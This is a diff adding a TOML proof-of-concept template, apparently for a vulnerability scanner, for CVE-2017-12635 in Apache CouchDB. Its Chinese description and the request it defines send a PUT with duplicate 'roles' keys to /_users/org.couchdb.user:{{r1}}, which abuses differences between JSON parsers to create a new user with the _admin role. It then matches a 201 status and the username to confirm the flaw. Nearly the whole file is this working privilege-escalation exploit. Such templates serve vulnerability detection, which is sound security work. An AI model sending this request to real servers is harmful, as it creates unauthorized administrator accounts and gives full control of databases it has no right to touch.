@@ -1,0 +1,41 @@
+[info]
+author = "AVE"
+description = "通过发送包含重复roles键的PUT请求到/_users/org.couchdb.user:{{r1}}，利用Erlang与JavaScript JSON解析器对重复键处理差异，创建具有_admin角色的管理员用户。响应状态码201且body包含用户名即表示漏洞存在。"
+id = "POC-AVE-2017-0036"
+name = "Apache CouchDB 越权创建管理员 PoC"
+severity = "critical"
+tags = [
+    "cve-2017-12635",
+    "couchdb",
+    "privilege-escalation",
+]
+vuln_id = [
+    "CVE-2017-12635",
+    "AVE-2017-0036",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "PUT"
+path = "/{{BaseURL}}/_users/org.couchdb.user:{{r1}}"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"type":"user","name":"{{r1}}","roles":["_admin"],"roles":[],"password":"fVyuyAECgYEAhgJzkPO1sTV1Dvs5bvls4tyVAsLy2I7wHKWJvJdDUpox2TnCMFT9"}'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["org.couchdb.user:{{r1}}"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [201]
+type = "status"
